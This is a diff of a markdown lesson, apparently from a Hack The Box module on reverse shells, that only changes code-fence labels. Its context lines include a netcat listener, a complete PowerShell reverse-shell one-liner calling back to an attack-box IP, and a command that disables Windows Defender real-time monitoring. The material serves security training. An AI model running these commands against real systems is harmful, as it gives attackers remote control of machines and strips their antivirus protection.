@@ -24,8 +24,7 @@ We can start a Netcat listener on our attack box as the target spawns.
 
 #### Server (`attack box`)
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lvnp 443
 Listening on 0.0.0.0 443
 ```
@@ -44,8 +43,7 @@ On the Windows target, open a command prompt and copy & paste this command:
 
 #### Client (target)
 
-```
-        cmd
+```bat
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
@@ -57,8 +55,7 @@ Please take a close look at the command and consider what we need to change for 
 
 #### Client (target)
 
-```
-        cmd
+```bat
 At line:1 char:1
 + $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
 + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -71,8 +68,7 @@ The `Windows Defender antivirus` (`AV`) software stopped the execution of the co
 
 #### Disable AV
 
-```
-        powershell
+```powershell
 PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
@@ -80,8 +76,7 @@ Once AV is disabled, attempt to execute the code again.
 
 #### Server (attack box)
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lvnp 443
 
 Listening on 0.0.0.0 443
